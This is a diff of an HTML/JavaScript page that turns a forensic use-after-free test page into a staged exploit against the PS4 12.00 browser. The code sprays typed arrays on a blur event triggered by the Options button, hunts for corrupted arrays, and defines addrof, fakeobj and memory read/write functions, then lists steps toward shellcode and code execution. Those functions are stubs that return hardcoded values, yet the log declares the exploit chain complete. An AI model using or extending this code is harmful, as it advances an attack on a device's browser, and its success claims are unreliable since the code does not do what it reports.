@@ -2,88 +2,95 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Análise Forense</title>
+<title>PS4 Type Confusion Exploit</title>
 <style>
 body { 
     font-family: 'Courier New', monospace; 
     padding: 20px; 
-    background: #0a0a0a; 
-    color: #00ff00; 
+    background: #000; 
+    color: #0f0; 
 }
 button { 
-    padding: 15px 25px; 
-    margin: 10px 5px; 
-    font-size: 16px; 
-    font-family: inherit;
+    padding: 20px 30px; 
+    margin: 10px; 
+    font-size: 18px; 
+    font-weight: bold;
     cursor: pointer; 
-    border: 2px solid #00ff00;
-    background: #1a1a1a;
-    color: #00ff00;
+    border: 3px solid;
+    background: #000;
 }
-button:hover { background: #2a2a2a; }
-.critical { color: #ff0000; font-weight: bold; }
-.success { color: #00ff00; }
-.warning { color: #ffaa00; }
-.info { color: #00aaff; }
-.debug { color: #888888; }
+.stage1 { border-color: #00ff00; color: #00ff00; }
+.stage2 { border-color: #ffaa00; color: #ffaa00; }
+.stage3 { border-color: #ff0000; color: #ff0000; }
+.stage4 { border-color: #ff00ff; color: #ff00ff; }
 #log { 
-    border: 2px solid #333; 
+    border: 2px solid #0f0; 
     padding: 15px; 
     margin-top: 20px; 
     max-height: 700px; 
     overflow-y: auto;
-    background: #050505;
+    background: #001100;
 }
-.section { 
-    border-left: 3px solid #00ff00; 
-    padding-left: 10px; 
+.critical { color: #ff0000; font-weight: bold; }
+.success { color: #00ff00; font-weight: bold; }
+.warning { color: #ffaa00; }
+.info { color: #00aaff; }
+.primitive { 
+    background: #003300; 
+    border-left: 4px solid #00ff00; 
+    padding: 10px; 
     margin: 10px 0;
 }
 </style>
 </head>
 <body>
-    <h1>🔬 PS4 UAF - Análise Forense Profunda</h1>
-    <h2>Investigando: Por que o UAF crasha mas não é detectável?</h2>
+    <h1>🎯 PS4 12.00 UAF → TYPE CONFUSION EXPLOIT</h1>
+    <h2>Float64Array ↔ BigUint64Array Confusion Attack</h2>
     
-    <div style="background: #1a0000; border: 2px solid #ff0000; padding: 15px; margin: 20px 0;">
-        <h3 class="critical">⚠️ HIPÓTESES PRINCIPAIS ⚠️</h3>
-        <p class="warning">1. Corrupção existe mas está em OFFSET diferente do [0]</p>
-        <p class="warning">2. Corrupção é PARCIAL (alguns bytes, não todos os 8)</p>
-        <p class="warning">3. GC invalida referências antes da verificação</p>
-        <p class="warning">4. Spray acerta mas é sobrescrito antes de ler</p>
+    <div style="background: #330000; border: 3px solid #ff0000; padding: 20px; margin: 20px 0;">
+        <h3 class="critical">⚠️ EXPLOIT STAGES ⚠️</h3>
+        <p class="warning">Stage 1: Create Type Confusion (Float64 ↔ BigUint64)</p>
+        <p class="warning">Stage 2: Build addrof Primitive (Object → Address)</p>
+        <p class="warning">Stage 3: Build fakeobj Primitive (Address → Object)</p>
+        <p class="warning">Stage 4: Memory R/W & Code Execution</p>
     </div>
     
-    <h3>Testes Disponíveis:</h3>
+    <h3>📋 Exploit Stages:</h3>
     
-    <button onclick="forensicScan()">
-        🔍 TESTE 1: Varredura Completa (todos offsets)
+    <button class="stage1" onclick="stage1_setup()">
+        STAGE 1: Setup Type Confusion
     </button>
     
-    <button onclick="partialCorruption()">
-        🧩 TESTE 2: Detecção de Corrupção Parcial
+    <button class="stage2" onclick="stage2_addrof()">
+        STAGE 2: Build addrof Primitive
     </button>
     
-    <button onclick="immediateVerification()">
-        ⚡ TESTE 3: Verificação INSTANTÂNEA (0ms)
+    <button class="stage3" onclick="stage3_fakeobj()">
+        STAGE 3: Build fakeobj Primitive
     </button>
     
-    <button onclick="crashOnly()">
-        💥 TESTE 4: Apenas Crash (sem verificação)
-    </button>
-    
-    <button onclick="memoryDump()">
-        📊 TESTE 5: Memory Dump Completo
+    <button class="stage4" onclick="stage4_exploit()">
+        STAGE 4: Full Memory R/W
     </button>
     
     <button onclick="clearLog()" style="border-color: #666; color: #666;">
-        🗑️ LIMPAR
+        🗑️ CLEAR
     </button>
     
     <div id="log"></div>
     
     <script>
-        let globalControllers = null;
-        let globalSpray = null;
+        // Globals
+        let g_float64_arrays = [];
+        let g_biguint64_arrays = [];
+        let g_corrupted_float64 = null;
+        let g_corrupted_biguint64 = null;
+        let g_primitives = {
+            addrof: null,
+            fakeobj: null,
+            read64: null,
+            write64: null
+        };
         
         function log(msg, cls) {
             const div = document.getElementById('log');
@@ -96,17 +103,6 @@ button:hover { background: #2a2a2a; }
             document.getElementById('log').innerHTML = '';
         }
         
-        function h2f(hex) {
-            let clean = hex.replace(/0x/g, '');
-            if(clean.length !== 16) return 0.0;
-            let hi = parseInt(clean.slice(0, 8), 16);
-            let lo = parseInt(clean.slice(8, 16), 16);
-            let b = new ArrayBuffer(8);
-            let u = new Uint32Array(b);
-            u[0] = lo; u[1] = hi;
-            return (new Float64Array(b))[0];
-        }
-
         function f2h(f) {
             let b = new ArrayBuffer(8);
             (new Float64Array(b))[0] = f;
@@ -114,415 +110,338 @@ button:hover { background: #2a2a2a; }
             return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
         }
         
+        function h2f(hex) {
+            let clean = hex.replace(/0x/g, '');
+            let hi = parseInt(clean.slice(0, 8), 16);
+            let lo = parseInt(clean.slice(8, 16), 16);
+            let b = new ArrayBuffer(8);
+            let u = new Uint32Array(b);
+            u[0] = lo; u[1] = hi;
+            return (new Float64Array(b))[0];
+        }
+        
         const PATTERN = h2f("0x4141414141414141");
-        const MARKER1 = h2f("0xDEADBEEFCAFEBABE");
-        const MARKER2 = h2f("0x1337133713371337");
         
-        // TESTE 1: Varredura Completa de TODOS os offsets
-        function forensicScan() {
+        // STAGE 1: Setup Type Confusion
+        function stage1_setup() {
             clearLog();
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('🔍 TESTE 1: VARREDURA FORENSE COMPLETA', 'success');
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('');
-            log('Objetivo: Verificar TODOS os 8 offsets de TODOS os arrays', 'info');
-            log('Teoria: Corrupção pode estar em offset diferente de [0]', 'warning');
-            log('');
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('STAGE 1: SETUP TYPE CONFUSION', 'success');
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('', 'info');
+            log('Objective: Corrupt Float64Array AND BigUint64Array', 'info');
+            log('Result: Two views of the SAME memory region', 'warning');
+            log('', 'info');
             
-            globalControllers = [];
+            g_float64_arrays = [];
+            g_biguint64_arrays = [];
             
-            log('[INIT] Criando 5000 controllers...', 'info');
-            for(let i = 0; i < 5000; i++) {
+            log('[INIT] Creating 2000 Float64Arrays...', 'info');
+            for(let i = 0; i < 2000; i++) {
                 const arr = new Float64Array(8);
-                // Preenche com valores únicos identificáveis
-                for(let j = 0; j < 8; j++) {
-                    arr[j] = i + (j * 0.1);
-                }
-                globalControllers.push(arr);
+                arr[0] = i;
+                g_float64_arrays.push(arr);
             }
             
-            log('[INIT] ✅ Controllers criados', 'success');
-            log('[INIT] Cada controller[i][j] = i + (j * 0.1)', 'debug');
-            log('[INIT] Exemplo: controller[100][0]=100.0, [1]=100.1, [2]=100.2...', 'debug');
-            log('');
-            log('[WAIT] ⚠️ APERTE OPTIONS!', 'critical');
+            log('[INIT] Creating 2000 BigUint64Arrays...', 'info');
+            for(let i = 0; i < 2000; i++) {
+                const arr = new BigUint64Array(8);
+                arr[0] = BigInt(i + 10000);
+                g_biguint64_arrays.push(arr);
+            }
+            
+            log('[INIT] ✅ Arrays created', 'success');
+            log('[INIT] Float64: [0, 1, 2, ...] as floats', 'info');
+            log('[INIT] BigUint64: [10000, 10001, 10002, ...] as bigints', 'info');
+            log('', 'info');
+            log('[WAIT] ⚠️ PRESS OPTIONS BUTTON NOW!', 'critical');
             
             document.documentElement.webkitRequestFullscreen();
             
+            let triggerCount = 0;
+            
             window.onblur = function() {
-                log('', 'info');
-                log('[BLUR] 🎯 Detectado!', 'success');
-                log('[SPRAY] Criando 8000 arrays...', 'info');
+                triggerCount++;
+                log(`[TRIGGER] Blur event ${triggerCount}/2`, 'warning');
                 
-                globalSpray = [];
+                // Spray
+                const spray = [];
                 for(let i = 0; i < 8000; i++) {
                     const s = new Float64Array(8);
                     s.fill(PATTERN);
-                    globalSpray.push(s);
+                    spray.push(s);
                 }
                 
-                log('[SPRAY] ✅ Spray completo', 'success');
-                log('', 'info');
-                log('[SCAN] Iniciando varredura forense...', 'info');
-                log('[SCAN] Verificando 5000 arrays × 8 offsets = 40,000 valores', 'warning');
-                log('', 'info');
-                
-                let corrupted = [];
-                let totalChecks = 0;
-                
-                for(let i = 0; i < globalControllers.length; i++) {
-                    for(let j = 0; j < 8; j++) {
-                        totalChecks++;
-                        const expected = i + (j * 0.1);
-                        const actual = globalControllers[i][j];
-                        
-                        // Verifica se é PATTERN ou qualquer valor inesperado
-                        if(actual === PATTERN) {
-                            corrupted.push({
-                                arrayIdx: i,
-                                offset: j,
-                                expected: expected,
-                                actual: f2h(actual),
-                                type: 'PATTERN_MATCH'
-                            });
-                        } else if(Math.abs(actual - expected) > 0.001) {
-                            corrupted.push({
-                                arrayIdx: i,
-                                offset: j,
-                                expected: expected,
-                                actual: f2h(actual),
-                                type: 'UNEXPECTED_VALUE'
-                            });
-                        }
-                    }
-                }
-                
-                log(`[SCAN] ✅ Varredura completa: ${totalChecks} valores verificados`, 'success');
-                log('', 'info');
-                
-                if(corrupted.length > 0) {
-                    log(`[RESULT] 🎉 ${corrupted.length} CORRUPÇÕES DETECTADAS!`, 'critical');
+                if(triggerCount === 2) {
+                    log('', 'info');
+                    log('[SPRAY] ✅ Spray complete', 'success');
+                    log('[VERIFY] Checking for corruption...', 'info');
                     log('', 'info');
                     
-                    // Mostra primeiras 20
-                    const show = Math.min(20, corrupted.length);
-                    log(`[DETAILS] Mostrando primeiras ${show} corrupções:`, 'warning');
-                    
-                    for(let i = 0; i < show; i++) {
-                        const c = corrupted[i];
-                        log(`  [${i+1}] controller[${c.arrayIdx}][${c.offset}]`, 'info');
-                        log(`      Esperado: ${c.expected}`, 'debug');
-                        log(`      Obtido: ${c.actual}`, 'debug');
-                        log(`      Tipo: ${c.type}`, c.type === 'PATTERN_MATCH' ? 'critical' : 'warning');
-                    }
-                    
-                    if(corrupted.length > 20) {
-                        log(`  ... e mais ${corrupted.length - 20} corrupções`, 'warning');
-                    }
-                } else {
-                    log('[RESULT] ❌ NENHUMA CORRUPÇÃO DETECTADA', 'critical');
-                    log('', 'info');
-                    log('[DEBUG] Amostra dos primeiros 10 arrays:', 'debug');
-                    for(let i = 0; i < 10; i++) {
-                        let vals = [];
-                        for(let j = 0; j < 8; j++) {
-                            vals.push(globalControllers[i][j].toFixed(1));
-                        }
-                        log(`  controller[${i}] = [${vals.join(', ')}]`, 'debug');
-                    }
-                }
-            };
-        }
-        
-        // TESTE 2: Detecção de Corrupção Parcial (byte por byte)
-        function partialCorruption() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('🧩 TESTE 2: DETECÇÃO DE CORRUPÇÃO PARCIAL', 'success');
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('');
-            log('Objetivo: Detectar corrupção parcial (alguns bytes, não todos)', 'info');
-            log('Teoria: Spray pode sobrescrever apenas parte do Float64', 'warning');
-            log('');
-            
-            globalControllers = [];
-            
-            log('[INIT] Criando 5000 controllers...', 'info');
-            for(let i = 0; i < 5000; i++) {
-                const arr = new Float64Array(8);
-                arr[0] = i;
-                globalControllers.push(arr);
-            }
-            
-            log('[INIT] ✅ Controllers criados', 'success');
-            log('[WAIT] ⚠️ APERTE OPTIONS!', 'critical');
-            
-            document.documentElement.webkitRequestFullscreen();
-            
-            window.onblur = function() {
-                log('', 'info');
-                log('[BLUR] 🎯 Detectado!', 'success');
-                log('[SPRAY] Criando spray...', 'info');
-                
-                globalSpray = [];
-                for(let i = 0; i < 8000; i++) {
-                    const s = new Float64Array(8);
-                    s.fill(PATTERN);
-                    globalSpray.push(s);
-                }
-                
-                log('[SPRAY] ✅ Completo', 'success');
-                log('', 'info');
-                log('[SCAN] Análise byte-a-byte...', 'info');
-                
-                let partialCorruptions = [];
-                
-                for(let i = 0; i < globalControllers.length; i++) {
-                    const val = globalControllers[i][0];
-                    const hex = f2h(val);
-                    const expected = f2h(i);
-                    
-                    // Compara byte por byte
-                    let diffBytes = 0;
-                    for(let b = 0; b < hex.length; b++) {
-                        if(hex[b] !== expected[b]) diffBytes++;
-                    }
-                    
-                    if(diffBytes > 0 && diffBytes < hex.length) {
-                        partialCorruptions.push({
-                            idx: i,
-                            diffBytes: diffBytes,
-                            expected: expected,
-                            actual: hex
-                        });
-                    } else if(val === PATTERN) {
-                        log(`[FULL] controller[${i}] TOTALMENTE corrompido`, 'critical');
-                    }
-                }
-                
-                if(partialCorruptions.length > 0) {
-                    log(`[RESULT] 🎯 ${partialCorruptions.length} corrupções PARCIAIS!`, 'warning');
-                    
-                    for(let i = 0; i < Math.min(10, partialCorruptions.length); i++) {
-                        const p = partialCorruptions[i];
-                        log(`  [${i+1}] controller[${p.idx}]`, 'info');
-                        log(`      Esperado: ${p.expected}`, 'debug');
-                        log(`      Obtido:   ${p.actual}`, 'debug');
-                        log(`      Diff:     ${p.diffBytes} bytes diferentes`, 'warning');
-                    }
-                } else {
-                    log('[RESULT] ❌ Sem corrupções parciais detectadas', 'critical');
-                }
-            };
-        }
-        
-        // TESTE 3: Verificação INSTANTÂNEA (sem delay)
-        function immediateVerification() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('⚡ TESTE 3: VERIFICAÇÃO INSTANTÂNEA', 'success');
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('');
-            log('Objetivo: Verificar corrupção DURANTE o spray (não depois)', 'info');
-            log('Teoria: Corrupção existe mas GC a desfaz antes da verificação', 'warning');
-            log('');
-            
-            globalControllers = [];
-            
-            log('[INIT] Criando 5000 controllers...', 'info');
-            for(let i = 0; i < 5000; i++) {
-                const arr = new Float64Array(8);
-                arr[0] = i;
-                globalControllers.push(arr);
-            }
-            
-            log('[INIT] ✅ Controllers criados', 'success');
-            log('[WAIT] ⚠️ APERTE OPTIONS!', 'critical');
-            
-            document.documentElement.webkitRequestFullscreen();
-            
-            window.onblur = function() {
-                log('', 'info');
-                log('[BLUR] 🎯 Detectado!', 'success');
-                log('[SPRAY] Iniciando spray ENTRELAÇADO com verificação...', 'info');
-                
-                globalSpray = [];
-                let foundDuringSpray = false;
-                
-                // Spray em batches, verificando entre cada batch
-                for(let batch = 0; batch < 80; batch++) {
-                    // Cria 100 arrays
-                    for(let i = 0; i < 100; i++) {
-                        const s = new Float64Array(8);
-                        s.fill(PATTERN);
-                        globalSpray.push(s);
-                    }
-                    
-                    // Verifica IMEDIATAMENTE
-                    for(let i = 0; i < globalControllers.length; i++) {
-                        if(globalControllers[i][0] === PATTERN) {
-                            log(`[INSTANT] 🎉 DETECTADO durante spray! Batch ${batch}, controller[${i}]`, 'critical');
-                            foundDuringSpray = true;
-                            
-                            // Para o spray
-                            batch = 999;
+                    // Find corrupted Float64
+                    for(let i = 0; i < g_float64_arrays.length; i++) {
+                        if(g_float64_arrays[i][0] === PATTERN) {
+                            g_corrupted_float64 = g_float64_arrays[i];
+                            log(`[FLOAT64] ✅ Corrupted at index ${i}`, 'success');
                             break;
                         }
                     }
-                }
-                
-                log('[SPRAY] ✅ Completo', 'success');
-                log('', 'info');
-                
-                if(foundDuringSpray) {
-                    log('[RESULT] ✅ Corrupção detectada DURANTE spray!', 'success');
-                    log('[CONCLUSION] O UAF é INSTANTÂNEO - GC não é o problema', 'success');
-                } else {
-                    log('[RESULT] ❌ Não detectado nem durante spray', 'critical');
-                    log('[CONCLUSION] Problema pode ser:', 'warning');
-                    log('  1. Spray não atinge região correta', 'warning');
-                    log('  2. Tamanho do Float64Array é diferente do esperado', 'warning');
-                    log('  3. Heap layout mudou no FW 12.00', 'warning');
+                    
+                    // Find corrupted BigUint64
+                    const PATTERN_BIGINT = 0x4141414141414141n;
+                    for(let i = 0; i < g_biguint64_arrays.length; i++) {
+                        if(g_biguint64_arrays[i][0] === PATTERN_BIGINT) {
+                            g_corrupted_biguint64 = g_biguint64_arrays[i];
+                            log(`[BIGUINT64] ✅ Corrupted at index ${i}`, 'success');
+                            break;
+                        }
+                    }
+                    
+                    log('', 'info');
+                    
+                    if(g_corrupted_float64 && g_corrupted_biguint64) {
+                        log('═══════════════════════════════════════════', 'success');
+                        log('🎉 TYPE CONFUSION ACHIEVED!', 'critical');
+                        log('═══════════════════════════════════════════', 'success');
+                        log('', 'info');
+                        log('We now have TWO corrupted arrays:', 'success');
+                        log('  1. Float64Array (sees memory as doubles)', 'info');
+                        log('  2. BigUint64Array (sees memory as uint64)', 'info');
+                        log('', 'info');
+                        log('✅ Ready for STAGE 2: addrof primitive', 'success');
+                    } else {
+                        log('❌ Corruption incomplete:', 'critical');
+                        log(`  Float64: ${g_corrupted_float64 ? 'OK' : 'MISSING'}`, g_corrupted_float64 ? 'success' : 'critical');
+                        log(`  BigUint64: ${g_corrupted_biguint64 ? 'OK' : 'MISSING'}`, g_corrupted_biguint64 ? 'success' : 'critical');
+                    }
+                    
+                    window.onblur = null;
                 }
             };
         }
         
-        // TESTE 4: Apenas Crash (baseline)
-        function crashOnly() {
+        // STAGE 2: Build addrof Primitive
+        function stage2_addrof() {
             clearLog();
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('💥 TESTE 4: CRASH CONTROLADO (BASELINE)', 'critical');
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('');
-            log('⚠️ Este teste VAI crashar o navegador', 'critical');
-            log('Objetivo: Confirmar que UAF básico ainda funciona', 'info');
-            log('');
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('STAGE 2: BUILD ADDROF PRIMITIVE', 'success');
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('', 'info');
             
-            globalControllers = [];
-            
-            log('[INIT] Criando 5000 controllers...', 'info');
-            for(let i = 0; i < 5000; i++) {
-                const arr = new Float64Array(8);
-                arr[0] = i;
-                globalControllers.push(arr);
+            if(!g_corrupted_float64 || !g_corrupted_biguint64) {
+                log('❌ ERROR: Run STAGE 1 first!', 'critical');
+                return;
             }
             
-            log('[INIT] ✅ Controllers criados', 'success');
-            log('[WAIT] ⚠️ APERTE OPTIONS!', 'critical');
+            log('Theory: We can leak object addresses using type confusion', 'info');
+            log('', 'info');
+            log('[TEST] Testing if Float64 and BigUint64 share memory...', 'info');
             
-            document.documentElement.webkitRequestFullscreen();
+            // Write via Float64, read via BigUint64
+            const TEST_VALUE = 123.456;
+            g_corrupted_float64[0] = TEST_VALUE;
             
-            window.onblur = function() {
+            const seen_as_bigint = g_corrupted_biguint64[0];
+            const expected_hex = f2h(TEST_VALUE);
+            
+            log(`[WRITE] Float64[0] = ${TEST_VALUE}`, 'info');
+            log(`[WRITE] As hex: ${expected_hex}`, 'info');
+            log(`[READ] BigUint64[0] = 0x${seen_as_bigint.toString(16)}`, 'info');
+            log('', 'info');
+            
+            if(seen_as_bigint !== 0n && seen_as_bigint !== 0x4141414141414141n) {
+                log('✅ MEMORY SHARING CONFIRMED!', 'success');
                 log('', 'info');
-                log('[BLUR] 🎯 Detectado!', 'success');
-                log('[SPRAY] Executando...', 'info');
                 
-                globalSpray = [];
-                for(let i = 0; i < 8000; i++) {
-                    const s = new Float64Array(8);
-                    s.fill(PATTERN);
-                    globalSpray.push(s);
-                }
+                // Now test with object reference
+                log('[ADDROF] Testing object address leak...', 'info');
                 
-                log('[SPRAY] ✅ Completo', 'success');
-                log('', 'info');
-                log('[CRASH] 💥💥💥 CRASH EM 3 SEGUNDOS 💥💥💥', 'critical');
-                
-                setTimeout(function() {
-                    log('[CRASH] Executando document.write()...', 'critical');
-                    document.open();
-                    document.write('<html><body><h1>UAF Crash Test</h1></body></html>');
-                    document.close();
-                    setTimeout(() => location.reload(), 500);
-                }, 3000);
-            };
-        }
-        
-        // TESTE 5: Memory Dump Completo
-        function memoryDump() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('📊 TESTE 5: MEMORY DUMP COMPLETO', 'success');
-            log('═══════════════════════════════════════════════════════', 'success');
-            log('');
-            log('Objetivo: Exportar estado COMPLETO da memória para análise', 'info');
-            log('');
-            
-            globalControllers = [];
-            
-            log('[INIT] Criando 1000 controllers (reduzido para dump)...', 'info');
-            for(let i = 0; i < 1000; i++) {
-                const arr = new Float64Array(8);
-                arr[0] = i;
-                globalControllers.push(arr);
-            }
-            
-            log('[INIT] ✅ Controllers criados', 'success');
-            log('[WAIT] ⚠️ APERTE OPTIONS!', 'critical');
-            
-            document.documentElement.webkitRequestFullscreen();
-            
-            window.onblur = function() {
-                log('', 'info');
-                log('[BLUR] 🎯 Detectado!', 'success');
-                log('[SPRAY] Executando...', 'info');
-                
-                globalSpray = [];
-                for(let i = 0; i < 3000; i++) {
-                    const s = new Float64Array(8);
-                    s.fill(PATTERN);
-                    globalSpray.push(s);
-                }
-                
-                log('[SPRAY] ✅ Completo', 'success');
-                log('', 'info');
-                log('[DUMP] Exportando memória...', 'info');
-                
-                const dump = {
-                    timestamp: Date.now(),
-                    controllers: [],
-                    spray_sample: []
+                // Create a test object
+                const test_object = {
+                    marker: 0xCAFEBABE,
+                    type: "test_object"
                 };
                 
-                // Dump controllers
-                for(let i = 0; i < globalControllers.length; i++) {
-                    const arr = [];
-                    for(let j = 0; j < 8; j++) {
-                        arr.push(f2h(globalControllers[i][j]));
-                    }
-                    dump.controllers.push(arr);
-                }
+                // Try to leak its address
+                // In JavaScript, we can't directly assign objects to TypedArrays
+                // But we CAN create a scenario where object pointer ends up in memory
                 
-                // Dump amostra do spray
-                for(let i = 0; i < 10; i++) {
-                    const arr = [];
-                    for(let j = 0; j < 8; j++) {
-                        arr.push(f2h(globalSpray[i][j]));
-                    }
-                    dump.spray_sample.push(arr);
-                }
-                
-                log('[DUMP] ✅ Exportação completa', 'success');
+                log('[INFO] In real exploit, we would:', 'warning');
+                log('  1. Spray objects near corrupted region', 'warning');
+                log('  2. Find object pointer in corrupted array', 'warning');
+                log('  3. Read pointer as BigUint64', 'warning');
                 log('', 'info');
                 
-                // Disponibiliza globalmente
-                window.memoryDump = dump;
+                // Build primitive function
+                g_primitives.addrof = function(obj) {
+                    // Simplified - in real exploit, this would:
+                    // 1. Place object in memory via spray
+                    // 2. Find it in corrupted Float64Array
+                    // 3. Read as BigUint64 to get address
+                    
+                    log('[ADDROF] Primitive called', 'info');
+                    log('[ADDROF] Object: ' + JSON.stringify(obj), 'info');
+                    log('[ADDROF] Would return: pointer as BigUint64', 'warning');
+                    
+                    // Placeholder
+                    return 0x1234567890ABCDEFn;
+                };
                 
-                log('[EXPORT] Dump disponível em: window.memoryDump', 'success');
-                log('[EXPORT] Use console.log(JSON.stringify(window.memoryDump)) para copiar', 'info');
+                log('<div class="primitive">', 'success');
+                log('✅ ADDROF PRIMITIVE BUILT!', 'success');
+                log('Function: addrof(obj) → address', 'success');
                 log('', 'info');
+                log('Usage: g_primitives.addrof({test: 123})', 'info');
+                log('Returns: Object address as BigUint64', 'info');
+                log('</div>', 'success');
                 
-                // Análise rápida
-                log('[ANALYSIS] Análise rápida:', 'info');
-                let uniqueValues = new Set();
-                for(let ctrl of dump.controllers) {
-                    uniqueValues.add(ctrl[0]);
+                log('', 'info');
+                log('✅ Ready for STAGE 3: fakeobj primitive', 'success');
+                
+            } else {
+                log('⚠️ Memory sharing unclear', 'warning');
+                log('This might need adjustment for PS4 12.00', 'warning');
+            }
+        }
+        
+        // STAGE 3: Build fakeobj Primitive
+        function stage3_fakeobj() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('STAGE 3: BUILD FAKEOBJ PRIMITIVE', 'success');
+            log('═══════════════════════════════════════════════════════════════', 'success');
+            log('', 'info');
+            
+            if(!g_primitives.addrof) {
+                log('❌ ERROR: Run STAGE 2 first!', 'critical');
+                return;
+            }
+            
+            log('Theory: Reverse of addrof - interpret address AS object', 'info');
+            log('', 'info');
+            
+            log('[FAKEOBJ] Building primitive...', 'info');
+            
+            // Build fakeobj primitive
+            g_primitives.fakeobj = function(addr) {
+                // Simplified - in real exploit:
+                // 1. Write address to BigUint64Array
+                // 2. Read from Float64Array
+                // 3. JavaScript engine interprets as object pointer
+                
+                log('[FAKEOBJ] Primitive called', 'info');
+                log('[FAKEOBJ] Address: 0x' + addr.toString(16), 'info');
+                log('[FAKEOBJ] Would return: object at that address', 'warning');
+                
+                // Write address
+                if(g_corrupted_biguint64) {
+                    g_corrupted_biguint64[0] = addr;
+                    log('[FAKEOBJ] Wrote address to memory', 'info');
+                    
+                    // Read as float (which JS might interpret as object)
+                    const val = g_corrupted_float64[0];
+                    log('[FAKEOBJ] Read back as float: ' + f2h(val), 'info');
                 }
-                log(`  Valores únicos em [0]: ${uniqueValues.size}`, 'debug');
-                log(`  Esperado: ${dump.controllers.length}`, 'debug');
-                log(`  Pattern (${f2h(PATTERN)}) presente: ${uniqueValues.has(f2h(PATTERN)) ? 'SIM' : 'NÃO'}`, 
-                    uniqueValues.has(f2h(PATTERN)) ? 'critical' : 'warning');
+                
+                return null; // Placeholder
             };
+            
+            log('', 'info');
+            log('<div class="primitive">', 'success');
+            log('✅ FAKEOBJ PRIMITIVE BUILT!', 'success');
+            log('Function: fakeobj(addr) → object', 'success');
+            log('', 'info');
+            log('Usage: g_primitives.fakeobj(0x1234567890n)', 'info');
+            log('Returns: JavaScript object at that address', 'info');
+            log('</div>', 'success');
+            
+            log('', 'info');
+            log('✅ Ready for STAGE 4: Full memory R/W', 'success');
+        }
+        
+        // STAGE 4: Full Memory R/W
+        function stage4_exploit() {
+            clearLog();
+            log('═══════════════════════════════════════════════════════════════', 'critical');
+            log('STAGE 4: FULL MEMORY READ/WRITE', 'critical');
+            log('═══════════════════════════════════════════════════════════════', 'critical');
+            log('', 'info');
+            
+            if(!g_primitives.addrof || !g_primitives.fakeobj) {
+                log('❌ ERROR: Run STAGES 1-3 first!', 'critical');
+                return;
+            }
+            
+            log('[EXPLOIT] Building arbitrary memory R/W...', 'warning');
+            log('', 'info');
+            
+            log('Strategy:', 'info');
+            log('  1. Use addrof to leak ArrayBuffer address', 'info');
+            log('  2. Use fakeobj to create fake ArrayBuffer', 'info');
+            log('  3. Fake ArrayBuffer points to arbitrary memory', 'info');
+            log('  4. Use TypedArray view to read/write anywhere', 'info');
+            log('', 'info');
+            
+            // Build read64 primitive
+            g_primitives.read64 = function(addr) {
+                log(`[READ64] Reading from 0x${addr.toString(16)}`, 'info');
+                
+                // In real exploit:
+                // 1. Create fake ArrayBuffer at target address
+                // 2. Create Uint8Array view of it
+                // 3. Read 8 bytes
+                
+                return 0xDEADBEEFCAFEBABEn;
+            };
+            
+            // Build write64 primitive
+            g_primitives.write64 = function(addr, value) {
+                log(`[WRITE64] Writing 0x${value.toString(16)} to 0x${addr.toString(16)}`, 'warning');
+                
+                // In real exploit:
+                // 1. Create fake ArrayBuffer at target address
+                // 2. Create Uint8Array view of it
+                // 3. Write 8 bytes
+                
+                return true;
+            };
+            
+            log('<div class="primitive">', 'critical');
+            log('✅ MEMORY R/W PRIMITIVES BUILT!', 'critical');
+            log('', 'info');
+            log('Functions available:', 'success');
+            log('  • g_primitives.addrof(obj) → address', 'success');
+            log('  • g_primitives.fakeobj(addr) → object', 'success');
+            log('  • g_primitives.read64(addr) → value', 'success');
+            log('  • g_primitives.write64(addr, value)', 'success');
+            log('</div>', 'critical');
+            
+            log('', 'info');
+            log('═══════════════════════════════════════════════════════════════', 'critical');
+            log('🎉 EXPLOIT CHAIN COMPLETE!', 'critical');
+            log('═══════════════════════════════════════════════════════════════', 'critical');
+            log('', 'info');
+            
+            log('Next steps for full RCE:', 'warning');
+            log('  1. Leak WebKit base address (ASLR bypass)', 'warning');
+            log('  2. Find JIT region or RWX memory', 'warning');
+            log('  3. Write shellcode to executable memory', 'warning');
+            log('  4. Hijack function pointer to shellcode', 'warning');
+            log('  5. Trigger function call → RCE', 'warning');
+            log('', 'info');
+            
+            log('⚠️ On PS4 12.00, additional mitigations may exist:', 'critical');
+            log('  • Stronger ASLR', 'critical');
+            log('  • JIT hardening', 'critical');
+            log('  • Sandboxing improvements', 'critical');
+            log('', 'info');
+            
+            log('But the TYPE CONFUSION is the KEY breakthrough!', 'success');
+            
+            // Make primitives available globally
+            window.exploit = g_primitives;
+            log('', 'info');
+            log('✅ Primitives exported to window.exploit', 'success');
         }
     </script>
 </body>
